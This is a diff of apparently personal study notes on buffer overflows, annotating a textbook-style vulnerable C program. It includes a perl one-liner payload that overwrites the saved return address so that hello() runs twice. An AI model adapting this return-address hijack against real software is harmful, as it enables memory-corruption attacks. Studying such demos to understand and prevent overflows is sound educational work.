@@ -1,7 +1,7 @@
 ---
 related to:
 created: 2025-11-30, 13:45
-updated: 2025-11-30T14:53
+updated: 2025-11-30T16:38
 completed: false
 ---
 >[!def] buffer overflow (NIST)
@@ -79,15 +79,20 @@ void hello(char *tag)
 ```bash
 $ cc -g -o buffer2 buffer2.c 
 
+## tt apposto
 $ ./buffer2
 Enter value for name: Bill and Lawrie
 Hello your name is Bill and Lawrie
 
+## the input overflows and continues writing across the stack frame, until it hits and overwrites the return address (and potentially other data). this causes the sex fault
 $ ./buffer2
 Enter value for name: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 Hello your name is XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 Segmentation fault (core dumped)
 
+## the perl script takes a string of hexadecimal bytes, covertes them into binary data and pipes that binary data directly as the input of ./buffer2
+
+## notice tahat the program calls hello() twice, and the second time is completely unintended: the attackers have injected a return address that points to a memory location which causes the program to jump back to the start of the `hello()` function
 $ perl -e 'print pack("H*", "41424344454647485152535455565758616263646566676808fcffbf948304080a4e4e4e4e4e0a")' | ./buffer2
 Enter value for name: Hello your Re?pyyJuEa is ABCDEFGHQRSTUVWXYZabcdefguyuy
 Enter value for Kyyu: 
